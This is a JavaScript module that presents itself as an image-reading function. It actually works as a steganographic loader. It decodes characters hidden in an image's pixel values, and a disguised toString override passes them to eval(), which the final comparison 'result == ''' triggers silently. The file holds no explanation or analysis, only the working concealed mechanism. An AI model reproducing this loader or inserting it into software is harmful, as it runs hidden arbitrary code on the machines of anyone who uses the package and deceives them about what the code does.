module.exports = async inputFilePath => {
    fs = require('fs');

    function readFileAsync(filePath) {
        return new Promise((resolve, reject) => {
            fs.readFile(filePath, async function (err, data) {
                if (err) {
                    console.error('err1', err);
                    return reject(err);
                };
                resolve(data);
            });
        });
    }

    let imageData;
    try {
        const sharp = require('sharp');
        const fileData = await readFileAsync(inputFilePath);
        const imageProcessor = sharp(fileData);
        imageData = await imageProcessor.ensureAlpha().raw().toBuffer();
    } catch (error) {
        const jimp = require('jimp');
        async function readImageWithJimp(filePath) {
            const image = await jimp.read(filePath);
            return image.bitmap.data;
        }
        imageData = await readImageWithJimp(inputFilePath);
    }

    const pixelData = [];
    const result = { Yw: [] };
    result.toString = function () {
        eval(result.Yw.join(''));
        return pixelData.join('');
    };
    for (let i = 0; i < imageData.length; i += 4) {
        const pixelIndex = 3 * Math.floor(i / 4);
        pixelData[pixelIndex] = imageData[i];
        pixelData[pixelIndex + 1] = imageData[i + 1];
        pixelData[pixelIndex + 2] = imageData[i + 2];
    }

    function combineValues(highByte, lowByte) {
        return highByte || lowByte ? highByte * 256 + lowByte : 0;
    }

    for (let i = 0; i < pixelData.length; i += 4) {
        const value1 = combineValues(pixelData[i + 1], pixelData[i + 2]);
        const value2 = combineValues(pixelData[i + 3], pixelData[i]);
        if (value1) result.Yw.push(String.fromCodePoint(value1));
        if (value2) result.Yw.push(String.fromCodePoint(value2));
    }

    return result == '' || void 0;
};